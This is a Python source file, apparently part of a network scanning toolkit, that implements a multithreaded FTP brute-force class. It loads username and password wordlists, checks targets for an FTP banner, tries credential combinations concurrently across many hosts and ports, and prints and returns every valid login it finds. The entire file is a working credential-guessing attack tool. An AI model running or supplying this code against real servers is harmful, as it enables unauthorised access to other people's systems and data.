import ftplib
import threading
from typing import Dict, List, Set, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
import time
import socket
from config.settings import THREADS, DEFAULT_FTP_USER_FILE, DEFAULT_FTP_PASS_FILE

class FTPBruteforce:
    def __init__(self, threads=None):
        self.threads = threads or THREADS
        self._lock = threading.Lock()
        self.results = {}
        self.total_attempts = 0
        self.current_attempts = 0
        self.errors = 0
        self.skip_ips = set()
        self.valid_targets = set()
        
        # 从文件加载用户名和密码
        self.default_users = self._load_users()
        self.default_passwords = self._load_passwords()

    def _load_users(self):
        """从文件加载用户名列表"""
        try:
            with open(DEFAULT_FTP_USER_FILE, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading FTP users file: {e}{Style.RESET_ALL}")
            return ['anonymous', 'ftp', 'admin']  # 返回基本默认值

    def _load_passwords(self):
        """从文件加载密码列表"""
        try:
            with open(DEFAULT_FTP_PASS_FILE, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading FTP passwords file: {e}{Style.RESET_ALL}")
            return ['', 'anonymous@', 'ftp']  # 返回基本默认值

    def verify_ftp(self, ip: str, port: int) -> bool:
        """验证FTP服务是否可用"""
        try:
            with socket.create_connection((ip, port), timeout=3) as sock:
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                return '220' in banner  # FTP服务通常以220响应码开始
        except:
            return False

    def try_login(self, ip: str, port: int, username: str, password: str) -> Optional[Tuple[str, str]]:
        """尝试FTP登录"""
        if ip in self.skip_ips:
            return None
            
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=3)
            
            # 处理密码中的用户名变量
            if '{user}' in password:
                password = password.replace('{user}', username)
                
            ftp.login(username, password)
            ftp.quit()
            return (username, password)
            
        except ftplib.error_perm:
            return None
        except Exception:
            self.skip_ips.add(ip)
            return None

    def scan_target(self, ip: str, port: int) -> None:
        """扫描单个FTP目标"""
        if not self.verify_ftp(ip, port):
            with self._lock:
                self.errors += 1
            return

        self.valid_targets.add(ip)
        
        with ThreadPoolExecutor(max_workers=5) as target_executor:
            futures = []
            
            for username in self.default_users:
                if ip in self.skip_ips:
                    break
                    
                passwords = [
                    pwd.format(user=username) if '{user}' in pwd else pwd
                    for pwd in self.default_passwords
                ]
                
                for password in passwords:
                    if ip in self.skip_ips:
                        break
                        
                    futures.append(
                        target_executor.submit(
                            self.try_credential,
                            ip,
                            port,
                            username,
                            password
                        )
                    )
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        username, password = result
                        with self._lock:
                            if ip not in self.results:
                                self.results[ip] = []
                            self.results[ip].append({
                                'port': port,
                                'username': username,
                                'password': password
                            })
                            print(f"\r{' ' * 100}\r{Fore.RED}[+] FTP Found: {ip}:{port} {username}:{password}{Style.RESET_ALL}")
                        return
                except Exception:
                    continue

    def try_credential(self, ip: str, port: int, username: str, password: str) -> Optional[Tuple[str, str]]:
        """尝试单个凭据组合"""
        with self._lock:
            self.current_attempts += 1
            self._current_user = username
            self._current_pass = password
        
        return self.try_login(ip, port, username, password)

    def scan(self, targets: Dict[str, Set[int]], userfile: str = None, passfile: str = None) -> Dict:
        """执行FTP扫描"""
        self.userfile = userfile or DEFAULT_FTP_USER_FILE
        self.passfile = passfile or DEFAULT_FTP_PASS_FILE
        
        total_targets = sum(len(ports) for ports in targets.values())
        self.total_attempts = total_targets * len(self.default_users) * len(self.default_passwords)
        self.current_attempts = 0
        self.errors = 0
        self._current_user = ''
        self._current_pass = ''
        self.valid_targets.clear()
        self.skip_ips.clear()

        print(f"\n{Fore.YELLOW}[*] Starting FTP bruteforce for {total_targets} targets...{Style.RESET_ALL}\n")
        
        start_time = time.time()
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for ip, ports in targets.items():
                    for port in ports:
                        futures.append(
                            executor.submit(self.scan_target, ip, port)
                        )
                
                completed = 0
                total = len(futures)
                
                for future in as_completed(futures):
                    completed += 1
                    elapsed = time.time() - start_time
                    speed = self.current_attempts / elapsed if elapsed > 0 else 0
                    progress = (completed / total) * 100
                    
                    print(f"\r{Fore.BLUE}[*] Progress: {progress:.1f}% ({completed}/{total}) "
                          f"Speed: {speed:.1f} attempts/s "
                          f"Current: {self._current_user}:{self._current_pass} "
                          f"Errors: {self.errors}{Style.RESET_ALL}", end='')

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] FTP bruteforce interrupted by user{Style.RESET_ALL}")
        
        elapsed = time.time() - start_time
        if self.results:
            print(f"\n{Fore.GREEN}[*] FTP bruteforce completed in {elapsed:.1f}s. "
                  f"Found {len(self.results)} valid credentials. "
                  f"Errors: {self.errors}{Style.RESET_ALL}\n")
            
            for ip, creds in self.results.items():
                for cred in creds:
                    print(f"{Fore.GREEN}    {ip}:{cred['port']} - {cred['username']}:{cred['password']}{Style.RESET_ALL}")
            print()
        else:
            print(f"\n{Fore.YELLOW}[*] FTP bruteforce completed in {elapsed:.1f}s. "
                  f"No valid credentials found. "
                  f"Errors: {self.errors}{Style.RESET_ALL}\n")
            
        return self.results 